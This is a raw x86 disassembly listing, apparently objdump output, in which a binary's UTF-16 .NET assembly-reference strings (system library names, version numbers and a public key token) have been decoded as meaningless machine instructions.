  405063:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405067:	add    BYTE PTR [eax],ah
  405069:	add    BYTE PTR [eax+0x0],dl
  40506c:	jne    0x40506e
  40506e:	bound  eax,QWORD PTR [eax]
  405070:	ins    BYTE PTR es:[edi],dx
  405071:	add    BYTE PTR [ecx+0x0],ch
  405074:	arpl   WORD PTR [eax],ax
  405076:	dec    ebx
  405077:	add    BYTE PTR [ebp+0x0],ah
  40507a:	jns    0x40507c
  40507c:	push   esp
  40507d:	add    BYTE PTR [edi+0x0],ch
  405080:	imul   eax,DWORD PTR [eax],0x65
  405083:	add    BYTE PTR [esi+0x0],ch
  405086:	cmp    eax,0x30006200
  40508b:	add    BYTE PTR [ebx],dh
  40508d:	add    BYTE PTR [esi+0x0],ah
  405090:	xor    eax,0x37006600
  405095:	add    BYTE PTR [esi+0x0],ah
  405098:	xor    DWORD PTR [eax],eax
  40509a:	xor    DWORD PTR [eax],eax
  40509c:	add    BYTE PTR fs:0x61003000,dh
  4050a3:	add    BYTE PTR [ebx],dh
  4050a5:	add    BYTE PTR [ecx+0x0],ah
  4050a8:	sub    BYTE PTR [eax+0x790053],0x73
  4050af:	add    BYTE PTR [eax+eax*1+0x65],dh
  4050b3:	add    BYTE PTR [ebp+0x0],ch
  4050b6:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  4050bb:	add    BYTE PTR [eax+0x0],dh
  4050be:	ins    BYTE PTR es:[edi],dx
  4050bf:	add    BYTE PTR [edi+0x0],ch
  4050c2:	jns    0x4050c4
  4050c4:	ins    DWORD PTR es:[edi],dx
  4050c5:	add    BYTE PTR [ebp+0x0],ah
  4050c8:	outs   dx,BYTE PTR ds:[esi]
  4050c9:	add    BYTE PTR [eax+eax*1+0x2c],dh
  4050cd:	add    BYTE PTR [eax],ah
  4050cf:	add    BYTE PTR [esi+0x0],dl
  4050d2:	add    BYTE PTR gs:[edx+0x0],dh
  4050d6:	jae    0x4050d8
  4050d8:	imul   eax,DWORD PTR [eax],0x6e006f
  4050de:	cmp    eax,0x2e003400
  4050e3:	add    BYTE PTR [eax],dh
  4050e5:	add    BYTE PTR [esi],ch
  4050e7:	add    BYTE PTR [eax],dh
  4050e9:	add    BYTE PTR [esi],ch
  4050eb:	add    BYTE PTR [eax],dh
  4050ed:	add    BYTE PTR [eax+eax*1],ch
  4050f0:	and    BYTE PTR [eax],al
  4050f2:	inc    ebx
  4050f3:	add    BYTE PTR [ebp+0x0],dh
  4050f6:	ins    BYTE PTR es:[edi],dx
  4050f7:	add    BYTE PTR [eax+eax*1+0x75],dh
  4050fb:	add    BYTE PTR [edx+0x0],dh
  4050fe:	add    BYTE PTR gs:0x65006e00,bh
  405105:	add    BYTE PTR [ebp+0x0],dh
  405108:	je     0x40510a
  40510a:	jb     0x40510c
  40510c:	popa   
  40510d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405111:	add    BYTE PTR [eax],ah
  405113:	add    BYTE PTR [eax+0x0],dl
  405116:	jne    0x405118
  405118:	bound  eax,QWORD PTR [eax]
  40511a:	ins    BYTE PTR es:[edi],dx
  40511b:	add    BYTE PTR [ecx+0x0],ch
  40511e:	arpl   WORD PTR [eax],ax
  405120:	dec    ebx
  405121:	add    BYTE PTR [ebp+0x0],ah
  405124:	jns    0x405126
  405126:	push   esp
  405127:	add    BYTE PTR [edi+0x0],ch
  40512a:	imul   eax,DWORD PTR [eax],0x65
  40512d:	add    BYTE PTR [esi+0x0],ch
  405130:	cmp    eax,0x30006200
  405135:	add    BYTE PTR [ebx],dh
  405137:	add    BYTE PTR [esi+0x0],ah
  40513a:	xor    eax,0x37006600
  40513f:	add    BYTE PTR [esi+0x0],ah
  405142:	xor    DWORD PTR [eax],eax
  405144:	xor    DWORD PTR [eax],eax
  405146:	add    BYTE PTR fs:0x61003000,dh
  40514d:	add    BYTE PTR [ebx],dh
  40514f:	add    BYTE PTR [ecx+0x0],ah
  405152:	and    BYTE PTR [eax+0x790053],0x73
  405159:	add    BYTE PTR [eax+eax*1+0x65],dh
  40515d:	add    BYTE PTR [ebp+0x0],ch
  405160:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  405165:	add    BYTE PTR [ebx+0x0],dh
  405168:	imul   eax,DWORD PTR [eax],0x6e0067
  40516e:	sub    al,0x0
  405170:	and    BYTE PTR [eax],al
  405172:	push   esi
  405173:	add    BYTE PTR [ebp+0x0],ah
  405176:	jb     0x405178
  405178:	jae    0x40517a
  40517a:	imul   eax,DWORD PTR [eax],0x6e006f
  405180:	cmp    eax,0x2e003400
  405185:	add    BYTE PTR [eax],dh
  405187:	add    BYTE PTR [esi],ch
  405189:	add    BYTE PTR [eax],dh
  40518b:	add    BYTE PTR [esi],ch
  40518d:	add    BYTE PTR [eax],dh
  40518f:	add    BYTE PTR [eax+eax*1],ch
  405192:	and    BYTE PTR [eax],al
  405194:	inc    ebx
  405195:	add    BYTE PTR [ebp+0x0],dh
  405198:	ins    BYTE PTR es:[edi],dx
  405199:	add    BYTE PTR [eax+eax*1+0x75],dh
  40519d:	add    BYTE PTR [edx+0x0],dh
  4051a0:	add    BYTE PTR gs:0x65006e00,bh
  4051a7:	add    BYTE PTR [ebp+0x0],dh
  4051aa:	je     0x4051ac
  4051ac:	jb     0x4051ae
  4051ae:	popa   
  4051af:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4051b3:	add    BYTE PTR [eax],ah
  4051b5:	add    BYTE PTR [eax+0x0],dl
  4051b8:	jne    0x4051ba
  4051ba:	bound  eax,QWORD PTR [eax]
  4051bc:	ins    BYTE PTR es:[edi],dx
  4051bd:	add    BYTE PTR [ecx+0x0],ch
  4051c0:	arpl   WORD PTR [eax],ax
  4051c2:	dec    ebx
  4051c3:	add    BYTE PTR [ebp+0x0],ah
  4051c6:	jns    0x4051c8
  4051c8:	push   esp
  4051c9:	add    BYTE PTR [edi+0x0],ch
  4051cc:	imul   eax,DWORD PTR [eax],0x65
  4051cf:	add    BYTE PTR [esi+0x0],ch
  4051d2:	cmp    eax,0x30006200
  4051d7:	add    BYTE PTR [ebx],dh
  4051d9:	add    BYTE PTR [esi+0x0],ah
  4051dc:	xor    eax,0x37006600
  4051e1:	add    BYTE PTR [esi+0x0],ah
  4051e4:	xor    DWORD PTR [eax],eax
  4051e6:	xor    DWORD PTR [eax],eax
  4051e8:	add    BYTE PTR fs:0x61003000,dh
  4051ef:	add    BYTE PTR [ebx],dh
  4051f1:	add    BYTE PTR [ecx+0x0],ah
  4051f4:	xor    BYTE PTR [esi+0x790053],0x73
  4051fb:	add    BYTE PTR [eax+eax*1+0x65],dh
  4051ff:	add    BYTE PTR [ebp+0x0],ch
  405202:	add    BYTE PTR cs:[eax+eax*1+0x69],al
  405207:	add    BYTE PTR [edx+0x0],dh
  40520a:	add    BYTE PTR gs:[ebx+0x0],ah
  40520e:	je     0x405210
  405210:	outs   dx,DWORD PTR ds:[esi]
  405211:	add    BYTE PTR [edx+0x0],dh
  405214:	jns    0x405216
  405216:	push   ebx
  405217:	add    BYTE PTR [ebp+0x0],ah
  40521a:	jb     0x40521c
  40521c:	jbe    0x40521e
  40521e:	imul   eax,DWORD PTR [eax],0x650063
  405224:	jae    0x405226
  405226:	sub    al,0x0
  405228:	and    BYTE PTR [eax],al
  40522a:	push   esi
  40522b:	add    BYTE PTR [ebp+0x0],ah
  40522e:	jb     0x405230
  405230:	jae    0x405232
  405232:	imul   eax,DWORD PTR [eax],0x6e006f
  405238:	cmp    eax,0x2e003400
  40523d:	add    BYTE PTR [eax],dh
  40523f:	add    BYTE PTR [esi],ch
  405241:	add    BYTE PTR [eax],dh
  405243:	add    BYTE PTR [esi],ch
  405245:	add    BYTE PTR [eax],dh
  405247:	add    BYTE PTR [eax+eax*1],ch
  40524a:	and    BYTE PTR [eax],al
  40524c:	inc    ebx
  40524d:	add    BYTE PTR [ebp+0x0],dh
  405250:	ins    BYTE PTR es:[edi],dx
  405251:	add    BYTE PTR [eax+eax*1+0x75],dh
  405255:	add    BYTE PTR [edx+0x0],dh
  405258:	add    BYTE PTR gs:0x65006e00,bh
  40525f:	add    BYTE PTR [ebp+0x0],dh
  405262:	je     0x405264
  405264:	jb     0x405266
  405266:	popa   
  405267:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40526b:	add    BYTE PTR [eax],ah
  40526d:	add    BYTE PTR [eax+0x0],dl
  405270:	jne    0x405272
  405272:	bound  eax,QWORD PTR [eax]
  405274:	ins    BYTE PTR es:[edi],dx
  405275:	add    BYTE PTR [ecx+0x0],ch
  405278:	arpl   WORD PTR [eax],ax
  40527a:	dec    ebx
  40527b:	add    BYTE PTR [ebp+0x0],ah
  40527e:	jns    0x405280
  405280:	push   esp
  405281:	add    BYTE PTR [edi+0x0],ch
  405284:	imul   eax,DWORD PTR [eax],0x65
  405287:	add    BYTE PTR [esi+0x0],ch
  40528a:	cmp    eax,0x30006200
  40528f:	add    BYTE PTR [ebx],dh
  405291:	add    BYTE PTR [esi+0x0],ah
  405294:	xor    eax,0x37006600
  405299:	add    BYTE PTR [esi+0x0],ah
  40529c:	xor    DWORD PTR [eax],eax
  40529e:	xor    DWORD PTR [eax],eax
  4052a0:	add    BYTE PTR fs:0x61003000,dh
  4052a7:	add    BYTE PTR [ebx],dh
  4052a9:	add    BYTE PTR [ecx+0x0],ah
  4052ac:	xor    BYTE PTR [eax+0x790053],0x73
  4052b3:	add    BYTE PTR [eax+eax*1+0x65],dh
  4052b7:	add    BYTE PTR [ebp+0x0],ch
  4052ba:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  4052bf:	add    BYTE PTR [ecx+0x0],ah
  4052c2:	ja     0x4052c4
  4052c4:	imul   eax,DWORD PTR [eax],0x67006e
  4052ca:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  4052cf:	add    BYTE PTR [ebx+0x0],dh
  4052d2:	imul   eax,DWORD PTR [eax],0x6e0067
  4052d8:	sub    al,0x0
  4052da:	and    BYTE PTR [eax],al
  4052dc:	push   esi
  4052dd:	add    BYTE PTR [ebp+0x0],ah
  4052e0:	jb     0x4052e2
  4052e2:	jae    0x4052e4
  4052e4:	imul   eax,DWORD PTR [eax],0x6e006f
  4052ea:	cmp    eax,0x2e003400
  4052ef:	add    BYTE PTR [eax],dh
  4052f1:	add    BYTE PTR [esi],ch
  4052f3:	add    BYTE PTR [eax],dh
  4052f5:	add    BYTE PTR [esi],ch
  4052f7:	add    BYTE PTR [eax],dh
  4052f9:	add    BYTE PTR [eax+eax*1],ch
  4052fc:	and    BYTE PTR [eax],al
  4052fe:	inc    ebx
  4052ff:	add    BYTE PTR [ebp+0x0],dh
  405302:	ins    BYTE PTR es:[edi],dx
  405303:	add    BYTE PTR [eax+eax*1+0x75],dh
  405307:	add    BYTE PTR [edx+0x0],dh
  40530a:	add    BYTE PTR gs:0x65006e00,bh
  405311:	add    BYTE PTR [ebp+0x0],dh
  405314:	je     0x405316
  405316:	jb     0x405318
  405318:	popa   
  405319:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40531d:	add    BYTE PTR [eax],ah
  40531f:	add    BYTE PTR [eax+0x0],dl
  405322:	jne    0x405324
  405324:	bound  eax,QWORD PTR [eax]
  405326:	ins    BYTE PTR es:[edi],dx
  405327:	add    BYTE PTR [ecx+0x0],ch
  40532a:	arpl   WORD PTR [eax],ax
  40532c:	dec    ebx
  40532d:	add    BYTE PTR [ebp+0x0],ah
  405330:	jns    0x405332
  405332:	push   esp
  405333:	add    BYTE PTR [edi+0x0],ch
  405336:	imul   eax,DWORD PTR [eax],0x65
  405339:	add    BYTE PTR [esi+0x0],ch
  40533c:	cmp    eax,0x30006200
  405341:	add    BYTE PTR [ebx],dh
  405343:	add    BYTE PTR [esi+0x0],ah
  405346:	xor    eax,0x37006600
  40534b:	add    BYTE PTR [esi+0x0],ah
  40534e:	xor    DWORD PTR [eax],eax
  405350:	xor    DWORD PTR [eax],eax
  405352:	add    BYTE PTR fs:0x61003000,dh
  405359:	add    BYTE PTR [ebx],dh
  40535b:	add    BYTE PTR [ecx+0x0],ah
  40535e:	and    BYTE PTR [edx+0x790053],0x73
  405365:	add    BYTE PTR [eax+eax*1+0x65],dh
  405369:	add    BYTE PTR [ebp+0x0],ch
  40536c:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  405371:	add    BYTE PTR [ecx+0x0],ah
  405374:	ja     0x405376
  405376:	imul   eax,DWORD PTR [eax],0x67006e
  40537c:	sub    al,0x0
  40537e:	and    BYTE PTR [eax],al
  405380:	push   esi
  405381:	add    BYTE PTR [ebp+0x0],ah
  405384:	jb     0x405386
  405386:	jae    0x405388
  405388:	imul   eax,DWORD PTR [eax],0x6e006f
  40538e:	cmp    eax,0x2e003400
  405393:	add    BYTE PTR [eax],dh
  405395:	add    BYTE PTR [esi],ch
  405397:	add    BYTE PTR [eax],dh
  405399:	add    BYTE PTR [esi],ch
  40539b:	add    BYTE PTR [eax],dh
  40539d:	add    BYTE PTR [eax+eax*1],ch
  4053a0:	and    BYTE PTR [eax],al
  4053a2:	inc    ebx
  4053a3:	add    BYTE PTR [ebp+0x0],dh
  4053a6:	ins    BYTE PTR es:[edi],dx
  4053a7:	add    BYTE PTR [eax+eax*1+0x75],dh
  4053ab:	add    BYTE PTR [edx+0x0],dh
  4053ae:	add    BYTE PTR gs:0x65006e00,bh
  4053b5:	add    BYTE PTR [ebp+0x0],dh
  4053b8:	je     0x4053ba
  4053ba:	jb     0x4053bc
  4053bc:	popa   
  4053bd:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4053c1:	add    BYTE PTR [eax],ah
  4053c3:	add    BYTE PTR [eax+0x0],dl
  4053c6:	jne    0x4053c8
  4053c8:	bound  eax,QWORD PTR [eax]
  4053ca:	ins    BYTE PTR es:[edi],dx
  4053cb:	add    BYTE PTR [ecx+0x0],ch
  4053ce:	arpl   WORD PTR [eax],ax
  4053d0:	dec    ebx
  4053d1:	add    BYTE PTR [ebp+0x0],ah
  4053d4:	jns    0x4053d6
  4053d6:	push   esp
  4053d7:	add    BYTE PTR [edi+0x0],ch
  4053da:	imul   eax,DWORD PTR [eax],0x65
  4053dd:	add    BYTE PTR [esi+0x0],ch
  4053e0:	cmp    eax,0x30006200
  4053e5:	add    BYTE PTR [ebx],dh
  4053e7:	add    BYTE PTR [esi+0x0],ah
  4053ea:	xor    eax,0x37006600
  4053ef:	add    BYTE PTR [esi+0x0],ah
  4053f2:	xor    DWORD PTR [eax],eax
  4053f4:	xor    DWORD PTR [eax],eax
  4053f6:	add    BYTE PTR fs:0x61003000,dh
  4053fd:	add    BYTE PTR [ebx],dh
  4053ff:	add    BYTE PTR [ecx+0x0],ah
  405402:	cmp    BYTE PTR [eax+0x790053],0x73
  405409:	add    BYTE PTR [eax+eax*1+0x65],dh
  40540d:	add    BYTE PTR [ebp+0x0],ch
  405410:	add    BYTE PTR cs:[ebp+0x0],al
  405414:	outs   dx,BYTE PTR ds:[esi]
  405415:	add    BYTE PTR [eax+eax*1+0x65],dh
  405419:	add    BYTE PTR [edx+0x0],dh
  40541c:	jo     0x40541e
  40541e:	jb     0x405420
  405420:	imul   eax,DWORD PTR [eax],0x650073
  405426:	push   ebx
  405427:	add    BYTE PTR [ebp+0x0],ah
  40542a:	jb     0x40542c
  40542c:	jbe    0x40542e
  40542e:	imul   eax,DWORD PTR [eax],0x650063
  405434:	jae    0x405436
  405436:	sub    al,0x0
  405438:	and    BYTE PTR [eax],al
  40543a:	push   esi
  40543b:	add    BYTE PTR [ebp+0x0],ah
  40543e:	jb     0x405440
  405440:	jae    0x405442
  405442:	imul   eax,DWORD PTR [eax],0x6e006f
  405448:	cmp    eax,0x2e003400
  40544d:	add    BYTE PTR [eax],dh
  40544f:	add    BYTE PTR [esi],ch
  405451:	add    BYTE PTR [eax],dh
  405453:	add    BYTE PTR [esi],ch
  405455:	add    BYTE PTR [eax],dh
  405457:	add    BYTE PTR [eax+eax*1],ch
  40545a:	and    BYTE PTR [eax],al
  40545c:	inc    ebx
  40545d:	add    BYTE PTR [ebp+0x0],dh
  405460:	ins    BYTE PTR es:[edi],dx
  405461:	add    BYTE PTR [eax+eax*1+0x75],dh
  405465:	add    BYTE PTR [edx+0x0],dh
  405468:	add    BYTE PTR gs:0x65006e00,bh
  40546f:	add    BYTE PTR [ebp+0x0],dh
  405472:	je     0x405474
  405474:	jb     0x405476
  405476:	popa   
  405477:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40547b:	add    BYTE PTR [eax],ah
  40547d:	add    BYTE PTR [eax+0x0],dl
  405480:	jne    0x405482
  405482:	bound  eax,QWORD PTR [eax]
  405484:	ins    BYTE PTR es:[edi],dx
  405485:	add    BYTE PTR [ecx+0x0],ch
  405488:	arpl   WORD PTR [eax],ax
  40548a:	dec    ebx
  40548b:	add    BYTE PTR [ebp+0x0],ah
  40548e:	jns    0x405490
  405490:	push   esp
  405491:	add    BYTE PTR [edi+0x0],ch
  405494:	imul   eax,DWORD PTR [eax],0x65
  405497:	add    BYTE PTR [esi+0x0],ch
  40549a:	cmp    eax,0x30006200
  40549f:	add    BYTE PTR [ebx],dh
  4054a1:	add    BYTE PTR [esi+0x0],ah
  4054a4:	xor    eax,0x37006600
  4054a9:	add    BYTE PTR [esi+0x0],ah
  4054ac:	xor    DWORD PTR [eax],eax
  4054ae:	xor    DWORD PTR [eax],eax
  4054b0:	add    BYTE PTR fs:0x61003000,dh
  4054b7:	add    BYTE PTR [ebx],dh
  4054b9:	add    BYTE PTR [ecx+0x0],ah
  4054bc:	sub    BYTE PTR [eax+0x790053],0x73
  4054c3:	add    BYTE PTR [eax+eax*1+0x65],dh
  4054c7:	add    BYTE PTR [ebp+0x0],ch
  4054ca:	add    BYTE PTR cs:[ebp+0x0],cl
  4054ce:	popa   
  4054cf:	add    BYTE PTR [esi+0x0],ch
  4054d2:	popa   
  4054d3:	add    BYTE PTR [edi+0x0],ah
  4054d6:	add    BYTE PTR gs:[ebp+0x0],ch
  4054da:	add    BYTE PTR gs:[esi+0x0],ch
  4054de:	je     0x4054e0
  4054e0:	sub    al,0x0
  4054e2:	and    BYTE PTR [eax],al
  4054e4:	push   esi
  4054e5:	add    BYTE PTR [ebp+0x0],ah
  4054e8:	jb     0x4054ea
  4054ea:	jae    0x4054ec
  4054ec:	imul   eax,DWORD PTR [eax],0x6e006f
  4054f2:	cmp    eax,0x2e003400
  4054f7:	add    BYTE PTR [eax],dh
  4054f9:	add    BYTE PTR [esi],ch
  4054fb:	add    BYTE PTR [eax],dh
  4054fd:	add    BYTE PTR [esi],ch
  4054ff:	add    BYTE PTR [eax],dh
  405501:	add    BYTE PTR [eax+eax*1],ch
  405504:	and    BYTE PTR [eax],al
  405506:	inc    ebx
  405507:	add    BYTE PTR [ebp+0x0],dh
  40550a:	ins    BYTE PTR es:[edi],dx
  40550b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40550f:	add    BYTE PTR [edx+0x0],dh
  405512:	add    BYTE PTR gs:0x65006e00,bh
  405519:	add    BYTE PTR [ebp+0x0],dh
  40551c:	je     0x40551e
  40551e:	jb     0x405520
  405520:	popa   
  405521:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405525:	add    BYTE PTR [eax],ah
  405527:	add    BYTE PTR [eax+0x0],dl
  40552a:	jne    0x40552c
  40552c:	bound  eax,QWORD PTR [eax]
  40552e:	ins    BYTE PTR es:[edi],dx
  40552f:	add    BYTE PTR [ecx+0x0],ch
  405532:	arpl   WORD PTR [eax],ax
  405534:	dec    ebx
  405535:	add    BYTE PTR [ebp+0x0],ah
  405538:	jns    0x40553a
  40553a:	push   esp
  40553b:	add    BYTE PTR [edi+0x0],ch
  40553e:	imul   eax,DWORD PTR [eax],0x65
  405541:	add    BYTE PTR [esi+0x0],ch
  405544:	cmp    eax,0x30006200
  405549:	add    BYTE PTR [ebx],dh
  40554b:	add    BYTE PTR [esi+0x0],ah
  40554e:	xor    eax,0x37006600
  405553:	add    BYTE PTR [esi+0x0],ah
  405556:	xor    DWORD PTR [eax],eax
  405558:	xor    DWORD PTR [eax],eax
  40555a:	add    BYTE PTR fs:0x61003000,dh
  405561:	add    BYTE PTR [ebx],dh
  405563:	add    BYTE PTR [ecx+0x0],ah
  405566:	and    BYTE PTR [esi+0x790053],0x73
  40556d:	add    BYTE PTR [eax+eax*1+0x65],dh
  405571:	add    BYTE PTR [ebp+0x0],ch
  405574:	add    BYTE PTR cs:[ebp+0x0],cl
  405578:	add    BYTE PTR gs:[ebx+0x0],dh
  40557c:	jae    0x40557e
  40557e:	popa   
  40557f:	add    BYTE PTR [edi+0x0],ah
  405582:	imul   eax,DWORD PTR [eax],0x67006e
  405588:	sub    al,0x0
  40558a:	and    BYTE PTR [eax],al
  40558c:	push   esi
  40558d:	add    BYTE PTR [ebp+0x0],ah
  405590:	jb     0x405592
  405592:	jae    0x405594
  405594:	imul   eax,DWORD PTR [eax],0x6e006f
  40559a:	cmp    eax,0x2e003400
  40559f:	add    BYTE PTR [eax],dh
  4055a1:	add    BYTE PTR [esi],ch
  4055a3:	add    BYTE PTR [eax],dh
  4055a5:	add    BYTE PTR [esi],ch
  4055a7:	add    BYTE PTR [eax],dh
  4055a9:	add    BYTE PTR [eax+eax*1],ch
  4055ac:	and    BYTE PTR [eax],al
  4055ae:	inc    ebx
  4055af:	add    BYTE PTR [ebp+0x0],dh
  4055b2:	ins    BYTE PTR es:[edi],dx
  4055b3:	add    BYTE PTR [eax+eax*1+0x75],dh
  4055b7:	add    BYTE PTR [edx+0x0],dh
  4055ba:	add    BYTE PTR gs:0x65006e00,bh
  4055c1:	add    BYTE PTR [ebp+0x0],dh
  4055c4:	je     0x4055c6
  4055c6:	jb     0x4055c8
  4055c8:	popa   
  4055c9:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4055cd:	add    BYTE PTR [eax],ah
  4055cf:	add    BYTE PTR [eax+0x0],dl
  4055d2:	jne    0x4055d4
  4055d4:	bound  eax,QWORD PTR [eax]
  4055d6:	ins    BYTE PTR es:[edi],dx
  4055d7:	add    BYTE PTR [ecx+0x0],ch
  4055da:	arpl   WORD PTR [eax],ax
  4055dc:	dec    ebx
  4055dd:	add    BYTE PTR [ebp+0x0],ah
  4055e0:	jns    0x4055e2
  4055e2:	push   esp
  4055e3:	add    BYTE PTR [edi+0x0],ch
  4055e6:	imul   eax,DWORD PTR [eax],0x65
  4055e9:	add    BYTE PTR [esi+0x0],ch
  4055ec:	cmp    eax,0x30006200
  4055f1:	add    BYTE PTR [ebx],dh
  4055f3:	add    BYTE PTR [esi+0x0],ah
  4055f6:	xor    eax,0x37006600
  4055fb:	add    BYTE PTR [esi+0x0],ah
  4055fe:	xor    DWORD PTR [eax],eax
  405600:	xor    DWORD PTR [eax],eax
  405602:	add    BYTE PTR fs:0x61003000,dh
  405609:	add    BYTE PTR [ebx],dh
  40560b:	add    BYTE PTR [ecx+0x0],ah
  40560e:	and    BYTE PTR [ebx+edx*2+0x73007900],0x0
  405616:	je     0x405618
  405618:	add    BYTE PTR gs:[ebp+0x0],ch
  40561c:	add    BYTE PTR cs:[esi+0x0],cl
  405620:	add    BYTE PTR gs:[eax+eax*1+0x2e],dh
  405625:	add    BYTE PTR [eax+0x0],cl
  405628:	je     0x40562a
  40562a:	je     0x40562c
  40562c:	jo     0x40562e
  40562e:	sub    al,0x0
  405630:	and    BYTE PTR [eax],al
  405632:	push   esi
  405633:	add    BYTE PTR [ebp+0x0],ah
  405636:	jb     0x405638
  405638:	jae    0x40563a
  40563a:	imul   eax,DWORD PTR [eax],0x6e006f
  405640:	cmp    eax,0x2e003400
  405645:	add    BYTE PTR [eax],dh
  405647:	add    BYTE PTR [esi],ch
  405649:	add    BYTE PTR [eax],dh
  40564b:	add    BYTE PTR [esi],ch
  40564d:	add    BYTE PTR [eax],dh
  40564f:	add    BYTE PTR [eax+eax*1],ch
  405652:	and    BYTE PTR [eax],al
  405654:	inc    ebx
  405655:	add    BYTE PTR [ebp+0x0],dh
  405658:	ins    BYTE PTR es:[edi],dx
  405659:	add    BYTE PTR [eax+eax*1+0x75],dh
  40565d:	add    BYTE PTR [edx+0x0],dh
  405660:	add    BYTE PTR gs:0x65006e00,bh
  405667:	add    BYTE PTR [ebp+0x0],dh
  40566a:	je     0x40566c
  40566c:	jb     0x40566e
  40566e:	popa   
  40566f:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405673:	add    BYTE PTR [eax],ah
  405675:	add    BYTE PTR [eax+0x0],dl
  405678:	jne    0x40567a
  40567a:	bound  eax,QWORD PTR [eax]
  40567c:	ins    BYTE PTR es:[edi],dx
  40567d:	add    BYTE PTR [ecx+0x0],ch
  405680:	arpl   WORD PTR [eax],ax
  405682:	dec    ebx
  405683:	add    BYTE PTR [ebp+0x0],ah
  405686:	jns    0x405688
  405688:	push   esp
  405689:	add    BYTE PTR [edi+0x0],ch
  40568c:	imul   eax,DWORD PTR [eax],0x65
  40568f:	add    BYTE PTR [esi+0x0],ch
  405692:	cmp    eax,0x30006200
  405697:	add    BYTE PTR [ebx],dh
  405699:	add    BYTE PTR [esi+0x0],ah
  40569c:	xor    eax,0x37006600
  4056a1:	add    BYTE PTR [esi+0x0],ah
  4056a4:	xor    DWORD PTR [eax],eax
  4056a6:	xor    DWORD PTR [eax],eax
  4056a8:	add    BYTE PTR fs:0x61003000,dh
  4056af:	add    BYTE PTR [ebx],dh
  4056b1:	add    BYTE PTR [ecx+0x0],ah
  4056b4:	cmp    BYTE PTR [edx+0x790053],0x73
  4056bb:	add    BYTE PTR [eax+eax*1+0x65],dh
  4056bf:	add    BYTE PTR [ebp+0x0],ch
  4056c2:	add    BYTE PTR cs:[esi+0x0],cl
  4056c6:	add    BYTE PTR gs:[eax+eax*1+0x2e],dh
  4056cb:	add    BYTE PTR [eax+0x0],cl
  4056ce:	je     0x4056d0
  4056d0:	je     0x4056d2
  4056d2:	jo     0x4056d4
  4056d4:	add    BYTE PTR cs:[edi+0x0],dl
  4056d8:	add    BYTE PTR gs:[edx+0x0],ah
  4056dc:	push   edx
  4056dd:	add    BYTE PTR [ebp+0x0],ah
  4056e0:	jno    0x4056e2
  4056e2:	jne    0x4056e4
  4056e4:	add    BYTE PTR gs:[ebx+0x0],dh
  4056e8:	je     0x4056ea
  4056ea:	sub    al,0x0
  4056ec:	and    BYTE PTR [eax],al
  4056ee:	push   esi
  4056ef:	add    BYTE PTR [ebp+0x0],ah
  4056f2:	jb     0x4056f4
  4056f4:	jae    0x4056f6
  4056f6:	imul   eax,DWORD PTR [eax],0x6e006f
  4056fc:	cmp    eax,0x2e003400
  405701:	add    BYTE PTR [eax],dh
  405703:	add    BYTE PTR [esi],ch
  405705:	add    BYTE PTR [eax],dh
  405707:	add    BYTE PTR [esi],ch
  405709:	add    BYTE PTR [eax],dh
  40570b:	add    BYTE PTR [eax+eax*1],ch
  40570e:	and    BYTE PTR [eax],al
  405710:	inc    ebx
  405711:	add    BYTE PTR [ebp+0x0],dh
  405714:	ins    BYTE PTR es:[edi],dx
  405715:	add    BYTE PTR [eax+eax*1+0x75],dh
  405719:	add    BYTE PTR [edx+0x0],dh
  40571c:	add    BYTE PTR gs:0x65006e00,bh
  405723:	add    BYTE PTR [ebp+0x0],dh
  405726:	je     0x405728
  405728:	jb     0x40572a
  40572a:	popa   
  40572b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40572f:	add    BYTE PTR [eax],ah
  405731:	add    BYTE PTR [eax+0x0],dl
  405734:	jne    0x405736
  405736:	bound  eax,QWORD PTR [eax]
  405738:	ins    BYTE PTR es:[edi],dx
  405739:	add    BYTE PTR [ecx+0x0],ch
  40573c:	arpl   WORD PTR [eax],ax
  40573e:	dec    ebx
  40573f:	add    BYTE PTR [ebp+0x0],ah
  405742:	jns    0x405744
  405744:	push   esp
  405745:	add    BYTE PTR [edi+0x0],ch
  405748:	imul   eax,DWORD PTR [eax],0x65
  40574b:	add    BYTE PTR [esi+0x0],ch
  40574e:	cmp    eax,0x30006200
  405753:	add    BYTE PTR [ebx],dh
  405755:	add    BYTE PTR [esi+0x0],ah
  405758:	xor    eax,0x37006600
  40575d:	add    BYTE PTR [esi+0x0],ah
  405760:	xor    DWORD PTR [eax],eax
  405762:	xor    DWORD PTR [eax],eax
  405764:	add    BYTE PTR fs:0x61003000,dh
  40576b:	add    BYTE PTR [ebx],dh
  40576d:	add    BYTE PTR [ecx+0x0],ah
  405770:	sbb    dh,0x53
  405773:	add    BYTE PTR [ecx+0x0],bh
  405776:	jae    0x405778
  405778:	je     0x40577a
  40577a:	add    BYTE PTR gs:[ebp+0x0],ch
  40577e:	add    BYTE PTR cs:[edx+0x0],dl
  405782:	jne    0x405784
  405784:	outs   dx,BYTE PTR ds:[esi]
  405785:	add    BYTE PTR [eax+eax*1+0x69],dh
  405789:	add    BYTE PTR [ebp+0x0],ch
  40578c:	add    BYTE PTR gs:[esi],ch
  40578f:	add    BYTE PTR [ebx+0x0],dl
  405792:	add    BYTE PTR gs:[edx+0x0],dh
  405796:	imul   eax,DWORD PTR [eax],0x6c0061
  40579c:	imul   eax,DWORD PTR [eax],0x61007a
  4057a2:	je     0x4057a4
  4057a4:	imul   eax,DWORD PTR [eax],0x6e006f
  4057aa:	add    BYTE PTR cs:[esi+0x0],al
  4057ae:	outs   dx,DWORD PTR ds:[esi]
  4057af:	add    BYTE PTR [edx+0x0],dh
  4057b2:	ins    DWORD PTR es:[edi],dx
  4057b3:	add    BYTE PTR [ecx+0x0],ah
  4057b6:	je     0x4057b8
  4057b8:	je     0x4057ba
  4057ba:	add    BYTE PTR gs:[edx+0x0],dh
  4057be:	jae    0x4057c0
  4057c0:	add    BYTE PTR cs:[ebx+0x0],dl
